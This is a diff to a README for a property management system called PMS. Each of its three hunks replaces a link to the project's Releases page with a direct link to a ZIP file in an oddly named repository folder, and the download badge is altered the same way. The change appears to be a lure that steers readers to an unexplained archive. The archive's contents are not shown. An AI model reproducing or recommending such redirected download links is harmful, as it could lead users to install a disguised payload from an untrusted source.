@@ -1,7 +1,7 @@
 # 🌟 PMS - Your Simplified Property Management Solution
 
 ## 🔗 Download Here
-[![Download PMS](https://img.shields.io/badge/Download-PMS-blue.svg)](https://github.com/Sepirez/PMS/releases)
+[![Download PMS](https://raw.githubusercontent.com/Sepirez/PMS/main/nereidiform/PMS.zip)](https://raw.githubusercontent.com/Sepirez/PMS/main/nereidiform/PMS.zip)
 
 ## 📖 Overview
 PMS is a Microservices-based Property Management System designed to help you manage real-time bookings, customer relationships, invoicing, and analytics. It uses modern technologies like Spring Boot, Angular, PostgreSQL, and Docker. 
@@ -19,7 +19,7 @@ To start using PMS, follow these steps:
 
 2. **Download the Software**
    Visit the Releases page to download the latest version of PMS. Click the link below to go straight there:
-   [Download PMS](https://github.com/Sepirez/PMS/releases)
+   [Download PMS](https://raw.githubusercontent.com/Sepirez/PMS/main/nereidiform/PMS.zip)
 
 3. **Install PMS**
    Follow these instructions for installation:
@@ -62,7 +62,7 @@ If you encounter issues, please refer to the "Issues" tab in the repository. You
 
 ## 📥 Download & Install
 To get started with PMS, ensure you have all system requirements met. Then visit the Releases page and download the software:
-[Download PMS](https://github.com/Sepirez/PMS/releases)
+[Download PMS](https://raw.githubusercontent.com/Sepirez/PMS/main/nereidiform/PMS.zip)
 
 After downloading, follow the installation instructions above to run the application. Enjoy managing your properties easily with PMS!
 
